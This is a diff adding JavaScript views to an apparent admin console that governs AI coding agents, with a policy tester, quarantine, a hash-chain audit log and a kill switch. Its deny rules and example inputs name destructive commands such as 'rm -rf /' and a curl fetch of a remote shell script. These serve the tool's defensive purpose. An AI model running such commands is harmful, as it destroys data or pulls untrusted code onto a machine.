+function rowHtml(d){return `<div class="row" data-id="${d.id}" tabindex="0"><div>${tag(d.out)}</div><div><div class="cmd">${esc(d.cmd)}</div><div class="who">${esc(d.agent.name)} on ${esc(d.agent.host)}</div></div><div class="tm">${fmtT(d.ts)}</div></div>`}
+function liveList(){const el=$('#live');if(!el)return;el.innerHTML=S.decisions.slice(-30).reverse().map(rowHtml).join('')||'<div class="empty">No decisions recorded yet. Run <code>bapedge exec</code> to see live decisions.</div>'}
+document.addEventListener('click',e=>{const r=e.target.closest('[data-id]');if(r&&(r.classList.contains('row')||r.classList.contains('click')))openDecision(r.dataset.id)});
+document.addEventListener('keydown',e=>{if(e.key==='Enter'){const r=e.target.closest('.row[data-id]');if(r)openDecision(r.dataset.id)}if(e.key==='Escape'){closeDrawer();closeModal()}});
+
+/* Decisions */
+VIEWS.decisions={
+  html(){return `<div class="panel"><div class="filters">
+    <input type="text" id="fq" placeholder="Search command, agent or host" aria-label="Search decisions">
+    <select id="fo" aria-label="Outcome"><option value="">All outcomes</option><option>ALLOW</option><option>DENY</option><option>STEP_UP</option><option>UNKNOWN</option></select>
+    <select id="fc" aria-label="Category"><option value="">All categories</option>${[...new Set(SCEN.map(s=>s.cat))].map(c=>`<option>${esc(c)}</option>`).join('')}</select>
+    <span class="spacer"></span><button class="btn" id="exp">Export CSV</button></div>
+    <div class="tw"><table><thead><tr><th>Time</th><th>Outcome</th><th>Action</th><th>Agent</th><th>Stopped or allowed by</th><th>Latency</th></tr></thead><tbody id="dt"></tbody></table></div></div>`},
+  after(){
+    const f=()=>{const q=($('#fq')?$('#fq').value.toLowerCase():''),o=($('#fo')?$('#fo').value:''),c=($('#fc')?$('#fc').value:'');
+      const rows=S.decisions.filter(d=>(!o||d.out===o)&&(!c||d.cat===c)&&(!q||(d.cmd+d.agent.name+d.agent.host).toLowerCase().includes(q))).slice(-200).reverse();
+      $('#dt').innerHTML=rows.length?rows.map(d=>`<tr class="click" data-id="${d.id}"><td class="mono">${fmtT(d.ts)}</td><td>${tag(d.out)}</td><td class="mono">${esc(d.cmd)}</td><td>${esc(d.agent.name)}<div class="who" style="color:var(--muted);font-size:12.5px">${esc(d.agent.host)}</div></td><td>${esc(d.inv)}</td><td class="mono">${d.latency} ms</td></tr>`).join(''):`<tr><td colspan="6" class="empty">No decisions match these filters. Clear a filter to see more.</td></tr>`};
+    ['fq','fo','fc'].forEach(i=>$('#'+i)&&$('#'+i).addEventListener('input',f));f();
+    if($('#exp')) $('#exp').onclick=()=>{const csv='time,outcome,action,agent,host,invariant,latency_ms\n'+S.decisions.map(d=>[d.ts.toISOString(),d.out,'"'+d.cmd.replace(/"/g,'""')+'"',d.agent.id,d.agent.host,'"'+d.inv+'"',d.latency].join(',')).join('\n');
+      const a=document.createElement('a');a.href=URL.createObjectURL(new Blob([csv],{type:'text/csv'}));a.download='bap-decisions.csv';a.click();toast('Exported decisions as CSV')};
+  }
+};
+function openDecision(id){
+  const d=S.decisions.find(x=>x.id===id);if(!d)return;
+  $('#drawer').innerHTML=`<div style="display:flex;justify-content:space-between;align-items:start"><div><h3>Decision evidence</h3><span class="mono" style="color:var(--muted)">${d.id}</span></div><button class="btn sm" id="dx">Close</button></div>
+  <div style="margin-top:12px">${tag(d.out)}</div>
+  <p style="margin:12px 0 0">${esc(d.why)}</p>
+  <dl class="kv"><dt>Action</dt><dd class="mono">${esc(d.cmd)}</dd><dt>Agent</dt><dd>${esc(d.agent.name)} <span class="mono">(${esc(d.agent.id)})</span></dd><dt>Host</dt><dd>${esc(d.agent.host)}, ${esc(d.agent.os)}</dd>
+  <dt>Mission</dt><dd>${esc(d.agent.mission)}</dd><dt>Enforced by</dt><dd>${esc(d.inv)}</dd><dt>Grant</dt><dd class="mono">${d.grant||'none (local policy only)'}</dd>
+  <dt>Eval latency</dt><dd>${d.latency} ms</dd><dt>Time</dt><dd>${d.ts.toLocaleString()}</dd><dt>Record hash</dt><dd class="mono">${d.hash}</dd></dl>
+  <h3 style="font-size:14px">Chain of custody</h3>
+  <div style="display:grid;gap:6px;font-size:13.5px;margin:8px 0 14px">${['Intent recorded (context only)','Policy decision: '+d.out.replace('_',' ').toLowerCase(),d.grant?'Bounded grant presented to gateway':'No resource-side grant required','Execution evidence '+(d.out==='ALLOW'?'reconciled & audited':'denied & reported')].map((s,i)=>`<div style="display:flex;gap:10px"><b style="color:var(--accent)">${i+1}</b><span>${s}</span></div>`).join('')}</div>
+  <button class="btn" id="dpol">Replay in policy tester</button>`;
+  $('#dx').onclick=closeDrawer;$('#dpol').onclick=()=>{closeDrawer();go('policies');setTimeout(()=>{$('#whyIn').value=d.cmd;runWhy()},0)};
+  $('#drawer').classList.add('on');$('#scrim').classList.add('on');$('#scrim').onclick=closeDrawer;
+}
+function closeDrawer(){$('#drawer').classList.remove('on');if(!$('#modal').classList.contains('on'))$('#scrim').classList.remove('on')}
+
+/* Agents */
+VIEWS.agents={
+  html(){return `<div class="panel"><div class="tw"><table><thead><tr><th>Agent</th><th>Host</th><th>Compliance</th><th>Layers A / B / C</th><th>Risk</th><th>Mission</th><th></th></tr></thead><tbody>
+  ${S.agents.map(a=>`<tr><td><b>${esc(a.name)}</b><div class="mono" style="color:var(--muted)">${esc(a.id)}</div></td><td>${esc(a.host)}<div style="color:var(--muted);font-size:12.5px">${esc(a.os)}</div></td><td>${tag(a.state)}</td>
+  <td>${a.layers.map((l,i)=>`<span class="tag ${l?'t-ALLOW':'t-DENY'}" title="Layer ${'ABC'[i]} ${l?'enforcing':'not enforcing'}">${'ABC'[i]} ${l?'on':'off'}</span>`).join(' ')}</td>
+  <td style="min-width:90px"><div class="bar"><div style="width:${a.risk*100}%;background:${a.risk>.7?'var(--deny)':a.risk>.4?'var(--unk)':'var(--allow)'}"></div></div><span class="mono">${a.risk.toFixed(2)}</span></td>
+  <td>${esc(a.mission)}</td><td style="white-space:nowrap">${a.state==='QUARANTINED'?`<button class="btn sm" data-rel="${a.id}">Release</button>`:`<button class="btn sm danger" data-q="${a.id}">Quarantine</button>`}</td></tr>`).join('')}
+  </tbody></table></div></div>`},
+  after(){$('#view').onclick=async e=>{
+    const q=e.target.closest('[data-q]'),r=e.target.closest('[data-rel]');
+    if(q)confirmBox('Quarantine this agent?','All its grants are revoked and every action fails closed until you release it.','Quarantine',async()=>{
+      const targetId = q.dataset.q;
+      try {
+        await fetch(S.api.base + '/api/v1/control/agent/kill', {
+          method: 'POST',
+          headers: {...getHeaders(), 'Content-Type': 'application/json'},
+          body: JSON.stringify({target: targetId, action: 'revoke'})
+        });
+      } catch(err){console.error(err)}
+      const a=S.agents.find(x=>x.id===targetId);
+      if(a) a.state='QUARANTINED';
+      audit('agent.quarantine',targetId);
+      toast((a?a.name:targetId)+' quarantined');
+      drawNav();render();
+    },true);
+    if(r)confirmBox('Release this agent?','Only release after Layer B is enforcing again. Compliance is re-checked on the next heartbeat.','Release agent',async()=>{
+      const targetId = r.dataset.rel;
+      try {
+        await fetch(S.api.base + '/api/v1/control/agent/kill', {
+          method: 'POST',
+          headers: {...getHeaders(), 'Content-Type': 'application/json'},
+          body: JSON.stringify({target: targetId, action: 'restore'})
+        });
+      } catch(err){console.error(err)}
+      const a=S.agents.find(x=>x.id===targetId);
+      if(a) { a.state='COMPLIANT'; a.layers=[1,1,1]; }
+      audit('agent.release',targetId);
+      toast((a?a.name:targetId)+' released');
+      drawNav();render();
+    });
+  }}
+};
+
+/* Grants */
+VIEWS.grants={
+  html(){return `<div class="panel"><div class="tw"><table><thead><tr><th>Grant</th><th>Agent</th><th>Scope</th><th>Uses</th><th>Expires</th><th></th></tr></thead><tbody id="gt"></tbody></table></div></div>`},
+  after(){const f=()=>{$('#gt').innerHTML=S.grants.map(g=>{const dead=g.ttl<=0||g.used>=g.max;
+    return `<tr><td class="mono">${g.id}</td><td class="mono">${esc(g.agent)}</td><td>${esc(g.scope)}<div class="mono" style="color:var(--muted)">${esc(g.res)}</div></td>
+    <td style="min-width:120px"><div class="bar"><div style="width:${g.used/g.max*100}%"></div></div><span class="mono">${g.used} of ${g.max}${g.max===1?' (single use)':''}</span></td>
+    <td>${g.revoked?tag('DENY').replace('DENY','REVOKED'):dead?'<span class="tag t-UNKNOWN">'+(g.used>=g.max?'Burned':'Expired')+'</span>':`<span class="mono">${Math.floor(g.ttl/60)}m ${String(g.ttl%60).padStart(2,'0')}s</span>`}</td>
+    <td>${dead||g.revoked?'':`<button class="btn sm danger" data-rg="${g.id}">Revoke</button>`}</td></tr>`}).join('')};
+    f();S._gf=f;
+    $('#view').onclick=e=>{const b=e.target.closest('[data-rg]');if(b)confirmBox('Revoke this grant?','The gateway rejects it immediately. The agent must request new authority and pass policy again.','Revoke grant',()=>{const g=S.grants.find(x=>x.id===b.dataset.rg);if(g){g.ttl=0;g.revoked=true;audit('grant.revoke',g.id);toast('Grant revoked');f()}},true)}}
+};
+
+/* Policies */
+function evalCmd(c){
+  const x=c.toLowerCase();
+  if(/policy\.cedar|bap-config|\.bap\/|managed-settings/.test(x))return{out:'DENY',why:'forbid: write to ProtectedAsset::"bap" (I2 interceptor gate)'};
+  if(/rm\s+-rf\s+\/|mkfs|dd\s+if=|format\s+c:|:\(\)\{/.test(x))return{out:'DENY',why:'forbid: Action::"exec.destructive" (default deny invariant)'};
+  if(/curl|wget|invoke-webrequest/.test(x)&&/https?:\/\/(?!gateway\.)/.test(x))return{out:'DENY',why:'forbid: Action::"net.egress" host not in Gateway::"approved"'};
+  if(/schema_migration|drop\s+table|truncate/.test(x))return{out:'STEP_UP',why:'forbid unless step_up: risk_score 0.85 is above 0.7'};
+  if(/^(get|post|put|delete)\s+\/api\//.test(x))return{out:'ALLOW',why:'permit api.call only if a valid bounded grant covers the derived action'};
+  if(/^(git|pytest|npm|cargo|go test|ls|dir|cat|python -m unittest)\b/.test(x))return{out:'ALLOW',why:'permit: developers group, exec.test or exec.git inside the current workspace'};
+  return{out:'UNKNOWN',why:'No policy matched. Safe fallback applies and the action is held (I1)'};
+}
+function runWhy(){const v=$('#whyIn').value.trim();if(!v)return;const r=evalCmd(v);$('#whyOut').innerHTML=`<div style="margin-top:12px">${tag(r.out)}</div><pre class="out">${esc(v)}\n-> ${esc(r.why)}</pre>`}
+VIEWS.policies={
+  html(){return `<div class="grid g-2">
+   <div class="panel"><div style="display:flex;gap:10px;align-items:center;margin-bottom:10px;flex-wrap:wrap"><div><h2>Cedar policy bundle</h2><p class="hint" style="margin:0">Active bundle from control plane: ${esc(S.policyVersion)} (${esc(S.policyDigest.slice(0,10))}...)</p></div><span class="spacer"></span><button class="btn" id="pdiff">Check syntax</button><button class="btn primary" id="ppub">Publish ${S.policyVersion.replace(/\d+/,m=>+m+1)}</button></div>
+     <label class="f" for="pol">Policy source</label><textarea id="pol" spellcheck="false"></textarea><div id="pmsg" style="margin-top:8px;font-size:13.5px"></div></div>
+   <div class="grid" style="align-content:start">
+    <div class="panel"><h2>Why was this allowed?</h2><p class="hint">Same idea as <span class="mono">bapedge why</span>. Type a command or API call.</p>
+      <label class="f" for="whyIn">Command or request</label><input type="text" id="whyIn" placeholder="rm -rf / or POST /api/v1/core-banking/transfer"><div style="display:flex;gap:6px;flex-wrap:wrap;margin-top:8px">${['git status','rm -rf /','write policy.cedar','curl http://203.0.113.9/x.sh','database.schema_migration'].map(s=>`<button class="btn sm" data-ex="${esc(s)}">${esc(s)}</button>`).join('')}</div>
+      <div style="margin-top:12px"><button class="btn primary" id="whyGo">Evaluate</button></div><div id="whyOut"></div></div>
+    <div class="panel"><h2>Replay against history</h2><p class="hint">What-if: how would the current draft have judged the last ${S.decisions.length} decisions?</p>
+      <button class="btn" id="replay">Run replay</button><div id="rpOut"></div></div>
+   </div></div>`},
+  after(){
+    $('#pol').value=S.policy;$('#pol').oninput=e=>S.policy=e.target.value;
+    $('#whyGo').onclick=runWhy;$('#whyIn').onkeydown=e=>{if(e.key==='Enter')runWhy()};
+    $('#view').onclick=e=>{const b=e.target.closest('[data-ex]');if(b){$('#whyIn').value=b.dataset.ex;runWhy()}};
+    $('#pdiff').onclick=()=>{const t=S.policy;let o=0,bad=0;for(const ch of t){if(ch==='(')o++;if(ch===')')o--;if(o<0)bad=1}const eff=(t.match(/\b(permit|forbid)\s*\(/g)||[]).length;
+      $('#pmsg').innerHTML=(o||bad)?`<span style="color:var(--deny)">Unbalanced parentheses. Check each permit or forbid block.</span>`:`<span style="color:var(--allow)">Looks valid: ${eff} rules found. Full validation runs on the server when you publish.</span>`};
+    $('#ppub').onclick=()=>confirmBox('Publish a new policy bundle?','The bundle is signed and distributed to every edge broker. Published bundles are immutable; fix mistakes by publishing a new version.','Publish and sign',async()=>{
+      const n=+S.policyVersion.replace(/\D/g,'')+1;S.policyVersion='v'+n;audit('policy.publish','bundle v'+n+' digest '+(await sha256(S.policy)).slice(0,12));toast('Published policy v'+n);render()});
+    $('#replay').onclick=()=>{const c={ALLOW:0,DENY:0,STEP_UP:0,UNKNOWN:0},ch={};
+      S.decisions.forEach(d=>{const r=evalCmd(d.cmd).out;c[r]=(c[r]||0)+1;if(r!==d.out)ch[d.cmd]=[d.out,r]});
+      $('#rpOut').innerHTML=`<div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:12px">${Object.entries(c).map(([k,v])=>`${tag(k)} <b>${v}</b>`).join('&nbsp;&nbsp;')}</div><p class="hint" style="margin-top:10px">${Object.keys(ch).length?Object.keys(ch).length+' action type(s) would change outcome: '+Object.entries(ch).map(([k,v])=>esc(k)+' ('+v[0]+' to '+v[1]+')').join('; '):'No outcomes would change. Safe to publish.'}</p>`}
+  }
+};
+
+/* Audit chain */
+let CHAIN=[];
+async function buildChain(){
+  CHAIN=[];let prev='0'.repeat(64);
+  const ev=['session.start','intent.classified','policy.decision','grant.minted','pep.authorize','grant.burned','exec.complete','policy.decision','agent.heartbeat','pep.deny','intent.classified','policy.decision'];
+  for(let i=0;i<ev.length;i++){const payload=ev[i]+' #'+(1000+i);const h=await sha256(prev+payload);CHAIN.push({i,payload,orig:payload,prev,hash:h});prev=h}
+}
+async function audit(type,detail){
+  const prev=CHAIN.length?CHAIN[CHAIN.length-1].hash:'0'.repeat(64),payload=type+' '+detail,hash=await sha256(prev+payload);
+  CHAIN.push({i:CHAIN.length,payload,orig:payload,prev,hash});if(S.view==='audit')render();
+}
+VIEWS.audit={
+  html(){return `<div class="panel"><div style="display:flex;gap:10px;flex-wrap:wrap;align-items:center;margin-bottom:6px"><div><h2>Hash chain</h2><p class="hint" style="margin:0">Each block commits to the one before it. Change one record and every later block stops matching.</p></div><span class="spacer"></span>
+    <button class="btn" id="tamper">Simulate tampering</button><button class="btn" id="restore">Restore</button><button class="btn primary" id="verify">Verify chain</button></div>
+    <div class="chain" id="chain"></div><div id="vres"></div></div>
+    <div class="panel" style="margin-top:16px"><h2>Recent events</h2><p class="hint">Newest first. Approvals and policy changes made in this console are recorded here too.</p><div class="tw"><table><thead><tr><th>#</th><th>Event</th><th>Hash</th></tr></thead><tbody>${CHAIN.slice(-8).reverse().map(b=>`<tr><td class="mono">${b.i}</td><td>${esc(b.payload)}</td><td class="mono">${b.hash.slice(0,24)}...</td></tr>`).join('')}</tbody></table></div></div>`},
+  after(){drawChain();
+    $('#verify').onclick=verifyChain;
+    $('#tamper').onclick=()=>{const b=CHAIN[Math.min(4,CHAIN.length-1)];b.payload=b.payload.replace(/#\d+/,'#9999 (edited)');drawChain();toast('Record 4 altered. Run verify.')};
+    $('#restore').onclick=()=>{CHAIN.forEach(b=>b.payload=b.orig);drawChain();$('#vres').innerHTML='';toast('Records restored')};
+  }
+};
+function drawChain(bad=-1,ok=false){const el=$('#chain');if(!el)return;
+  el.innerHTML=CHAIN.map(b=>`<div class="blk ${bad>=0?(b.i>=bad?'bad':'ok'):ok?'ok':''}"><b>Block ${b.i}</b><div class="p" title="${esc(b.payload)}">${esc(b.payload)}</div><div class="h">${b.hash.slice(0,20)}...</div></div>`).join('')}
+async function verifyChain(){
+  let prev='0'.repeat(64),bad=-1;
+  for(const b of CHAIN){const h=await sha256(prev+b.payload);if(h!==b.hash){bad=b.i;break}prev=b.hash}
+  drawChain(bad,bad<0);
+  $('#vres').innerHTML=bad<0?`<div class="verdict ok">Chain verified. All ${CHAIN.length} blocks match their recorded hashes.</div>`:`<div class="verdict bad">Integrity failure at block ${bad}. Its content no longer matches the hash that block ${bad+1<CHAIN.length?bad+1:bad} committed to, so every block from ${bad} onward is untrusted.</div>`;
+}
+
+/* Endpoint */
+const LAYERS={
+ windows:[['A','Cooperative hooks','Claude Code PreToolUse hook wired to bapedge exec'],['B','Kernel execution control','Windows Job Objects and restricted tokens'],['C','Network egress pinning','Traffic pinned to the Gateway PEP perimeter']],
+ macos:[['A','Cooperative hooks','Managed settings push the PreToolUse hook'],['B','Kernel execution control','Apple Seatbelt sandbox-exec kernel profiles'],['C','Network egress pinning','Network extension pinned to the Gateway PEP']],
+ linux:[['A','Cooperative hooks','Managed settings and wrapped agent binaries'],['B','Kernel execution control','seccomp, namespaces and eBPF execution gate'],['C','Network egress pinning','nftables egress rules pinned to the Gateway PEP']],
+};
+let epOS='windows',epMDM='intune',stepTok=null;
+VIEWS.endpoint={
+  html(){return `<div class="grid g-eq">
+   <div class="panel"><h2>Three-layer enforcement</h2><p class="hint">Missing Layer B quarantines a managed device</p>
+    <div class="seg" id="osSeg">${['windows','macos','linux'].map(o=>`<button aria-pressed="${o===epOS}" data-os="${o}">${o==='macos'?'macOS':o[0].toUpperCase()+o.slice(1)}</button>`).join('')}</div>
+    <div style="margin-top:14px" id="layers"></div></div>
+   <div class="panel"><h2>MDM packaging</h2><p class="hint">Deploy the hooks and sandbox through your device manager</p>
+    <div class="seg" id="mdmSeg">${[['intune','Microsoft Intune'],['jamf','Jamf Pro']].map(([k,l])=>`<button aria-pressed="${k===epMDM}" data-mdm="${k}">${l}</button>`).join('')}</div>
+    <pre class="out" id="mdmOut"></pre><button class="btn" id="mdmCopy">Copy payload</button></div>
+   <div class="panel"><h2>Biometric step-up</h2><p class="hint">High-risk actions need a fresh human check. Tokens are single-use.</p>
+    <label class="f" for="suOp">Operation</label><select id="suOp"><option>database.schema_migration</option><option>core-banking.transfer.bulk</option><option>prod.secrets.rotate</option></select>
+    <div style="display:flex;gap:8px;margin-top:10px;flex-wrap:wrap"><button class="btn" id="suCh">Request challenge</button><button class="btn primary" id="suOk" disabled>Approve with biometrics</button><button class="btn" id="suReplay" disabled>Replay token</button></div><pre class="out" id="suOut">No challenge yet.</pre></div>
+   <div class="panel"><h2>Offline behavior</h2><p class="hint">Safe local work continues offline. Anything that leaves the machine fails closed.</p>
+    <label class="f" for="offIn">Operation</label><input type="text" id="offIn" value="pytest tests/unit"><div style="margin-top:10px"><button class="btn primary" id="offGo">Classify</button></div><div id="offOut"></div></div>
+  </div>`},
+  after(){
+    const L=()=>{$('#layers').innerHTML=LAYERS[epOS].map(([k,t,d])=>`<div class="layer"><div class="ic">${k}</div><div><b>${t}</b><small>${d}</small></div></div>`).join('')};L();
+    const M=()=>{const p=epMDM==='intune'?{platform:'windows',provider:'Microsoft Intune',type:'CSP',settings:{'dangerouslySkipPermissions':false,'preToolUseHook':'bapedge exec','egressPin':'gateway.internal:8090','sandbox':'JobObject+RestrictedToken'}}:{platform:'macos',provider:'Jamf Pro',type:'mobileconfig',settings:{'dangerouslySkipPermissions':false,'preToolUseHook':'bapedge exec','egressPin':'gateway.internal:8090','sandbox':'Seatbelt/sandbox-exec'}};$('#mdmOut').textContent=JSON.stringify(p,null,2)};M();
+    $('#osSeg').onclick=e=>{const b=e.target.closest('[data-os]');if(!b)return;epOS=b.dataset.os;[...$('#osSeg').children].forEach(c=>c.setAttribute('aria-pressed',c===b));L()};
+    $('#mdmSeg').onclick=e=>{const b=e.target.closest('[data-mdm]');if(!b)return;epMDM=b.dataset.mdm;[...$('#mdmSeg').children].forEach(c=>c.setAttribute('aria-pressed',c===b));M()};
+    $('#mdmCopy').onclick=()=>navigator.clipboard?.writeText($('#mdmOut').textContent).then(()=>toast('Payload copied'),()=>toast('Copy failed. Select the text instead.'));
+    let ch=null;
+    $('#suCh').onclick=()=>{ch={id:'chal_'+hex(8),op:$('#suOp').value,exp:Date.now()+60000};stepTok=null;$('#suOut').textContent=`Challenge ${ch.id}\noperation: ${ch.op}\nrisk: 0.85\nexpires in 60s`;$('#suOk').disabled=false;$('#suReplay').disabled=true};
+    $('#suOk').onclick=async()=>{if(!ch)return;stepTok='st_'+(await sha256(ch.id+Date.now())).slice(0,24);$('#suOut').textContent=`Verified via WINDOWS_HELLO / TOUCH_ID\nStepUpToken: ${stepTok}\nsingle use, bound to ${ch.op}`;audit('stepup.approve',ch.id);$('#suOk').disabled=true;$('#suReplay').disabled=false};
+    $('#suReplay').onclick=()=>{$('#suOut').textContent+='\n\nReplay rejected: token already consumed.';audit('stepup.replay_rejected',stepTok);$('#suReplay').disabled=true};
+    $('#offGo').onclick=()=>{const v=$('#offIn').value.trim();if(!v)return;const t2=/^(post|put|delete|get)\s+\/|curl|wget|ssh|scp|kubectl|terraform|aws |az /i.test(v);
+      $('#offOut').innerHTML=`<div style="margin-top:12px"><span class="tag ${t2?'t-DENY':'t-ALLOW'}">${t2?'Tier 2: fails closed offline':'Tier 1: allowed offline'}</span></div><p class="hint" style="margin-top:8px">${t2?'This leaves the machine, so it needs a live control plane and gateway.':'Safe local development inside the workspace. Decisions are spooled and ingested when you reconnect.'}</p>`};
+  }
+};
+
+/* Settings */
+VIEWS.settings={
+  html(){return `<div class="grid g-eq">
+   <div class="panel"><h2>Control plane connection</h2><p class="hint">Enter your admin token to unmask telemetry and unlock administrative actions (quarantine, kill-switch).</p>
+     <label class="f" for="cb">Control Plane Host</label><input type="text" id="cb" value="${esc(S.api.base)}"><div style="height:10px"></div>
+     <label class="f" for="ct">Admin token</label><input type="password" id="ct" autocomplete="off" placeholder="Paste BAP admin token" value="${esc(S.api.token)}">
+     <div style="margin-top:12px;display:flex;gap:8px"><button class="btn primary" id="cgo">Save & Authenticate</button><button class="btn" id="cdemo">Clear token</button></div><pre class="out" id="cout">${S.api.token ? 'Admin token loaded in memory.' : 'Unauthenticated (public mode). Prompts and PII masked.'}</pre></div>
+   <div class="panel"><h2>Access hardening checklist</h2><p class="hint">Zero-trust controls protecting this control plane instance</p>
+     ${[['Strict Admin Authentication','Admin token required for kill-switch and user unmasking'],['SPIFFE Cryptographic Trust Domain','Agents attested against spiffe://bap.internal'],['WAN Adaptive Timeouts','5000ms WAN audit timeouts with local offline SQLite spool'],['Apple Seatbelt & Windows JobObjects','Layer B kernel isolation active across OS matrix'],['Zero-Trust Public Telemetry Redaction','Prompts & user emails protected unless authenticated']].map(([a,b],i)=>`<label style="display:flex;gap:10px;padding:9px 0;border-bottom:1px solid var(--line);cursor:default"><input type="checkbox" checked disabled><span><b style="font-weight:600">${a}</b><br><span style="color:var(--muted);font-size:13px">${b}</span></span></label>`).join('')}</div></div>`},
+  after(){
+    $('#cdemo').onclick=()=>{S.api.token='';try{sessionStorage.removeItem('bap_admin_token')}catch(e){}$('#ct').value='';$('#cout').textContent='Admin token cleared.';fetchTelemetry()};
+    $('#cgo').onclick=async()=>{
+      const base=$('#cb').value.replace(/\/+$/,'');
+      S.api.token=$('#ct').value.trim();
+      try{if(S.api.token) sessionStorage.setItem('bap_admin_token',S.api.token); else sessionStorage.removeItem('bap_admin_token')}catch(e){}
+      $('#cout').textContent='Testing admin authentication...';
+      try{
+        const r=await fetch(base+'/api/v1/inspector/data',{headers:getHeaders()});
+        const j=await r.json();
+        S.api.base=base;
+        ingestServerData(j);
+        $('#cout').textContent='Connected and authenticated successfully!\nPolicy: '+j.policy_version+'\nAudit chain: '+j.chain_status;
+        toast('Admin authentication active');
+      }
+      catch(err){
+        $('#cout').textContent='Failed: '+err.message;
+      }
+    }
+  }
+};
+function connUI(){
+  const l=S.api.live;
+  $('#connDot').className='dot'+(l?' live':'');
+  $('#connTxt').textContent=l?(S.api.token?'Admin live':'Live (telemetry masked)'):'Connecting...';
+  $('#sideMode').textContent=l?(S.api.token?'Admin authenticated':'Control plane connected'):'Reconnecting...';
+}
+$('#connPill').onclick=()=>go('settings');
+
+/* ---------- modal ---------- */
+function confirmBox(title,body,cta,fn,danger){
+  $('#modal').innerHTML=`<h3>${esc(title)}</h3><p style="margin:0;color:var(--muted)">${esc(body)}</p><div class="acts"><button class="btn" id="mc">Cancel</button><button class="btn ${danger?'danger':'primary'}" id="mo">${esc(cta)}</button></div>`;
+  $('#modal').classList.add('on');$('#scrim').classList.add('on');$('#scrim').onclick=closeModal;$('#mc').onclick=closeModal;$('#mo').onclick=()=>{closeModal();fn()};$('#mo').focus();
+}
+function closeModal(){$('#modal').classList.remove('on');if(!$('#drawer').classList.contains('on'))$('#scrim').classList.remove('on')}
+
+/* kill switch */
+async function setKill(v){
+  S.kill=v;
+  $('#killBanner').classList.toggle('on',v);
+  $('#killBtn').textContent=v?'Kill switch is on':'Kill switch';
+  try {
+    await fetch(S.api.base + '/api/v1/control/kill-switch', {
+      method: 'POST',
+      headers: {...getHeaders(), 'Content-Type': 'application/json'},
+      body: JSON.stringify({enabled: v})
+    });
+  } catch(e) { console.error('Failed to update kill-switch on server:', e) }
+  audit(v?'killswitch.on':'killswitch.off','console');
+  if(S.view==='overview')render();
+}
+$('#killBtn').onclick=()=>S.kill?0:confirmBox('Turn on the kill switch?','Every agent fails closed immediately and no new grants are minted. Use this if you suspect compromise.','Turn on kill switch',()=>setKill(true),true);
+$('#killOff').onclick=()=>confirmBox('Resume normal operation?','Agents re-sync policy and can request grants again.','Resume',()=>setKill(false));
+$('#pauseBtn').onclick=()=>{S.paused=!S.paused;$('#pauseBtn').textContent=S.paused?'Resume stream':'Pause stream';if(S.view==='overview')render()};
+$('#themeBtn').onclick=()=>{const r=document.documentElement,dark=(r.dataset.theme==='dark')||(!r.dataset.theme&&matchMedia('(prefers-color-scheme:dark)').matches);r.dataset.theme=dark?'light':'dark'};
+
+/* ---------- live polling loop ---------- */
+setInterval(()=>{
+  S.grants.forEach(g=>{if(g.ttl>0)g.ttl--});
+  if(S.view==='grants'&&S._gf)S._gf();
+},1000);
+
+// Poll live control plane every 3.5s
+setInterval(()=>{
+  if(!S.paused) fetchTelemetry();
+},3500);
+
+/* ---------- boot ---------- */
+(async()=>{
+  try {
+    const savedToken = sessionStorage.getItem('bap_admin_token');
+    if(savedToken) S.api.token = savedToken;
+  } catch(e){}
+  seedFallback();
+  await buildChain();
+  connUI();
+  go('overview');
+  await fetchTelemetry();
+})();
+</script>
+</body>
+</html>
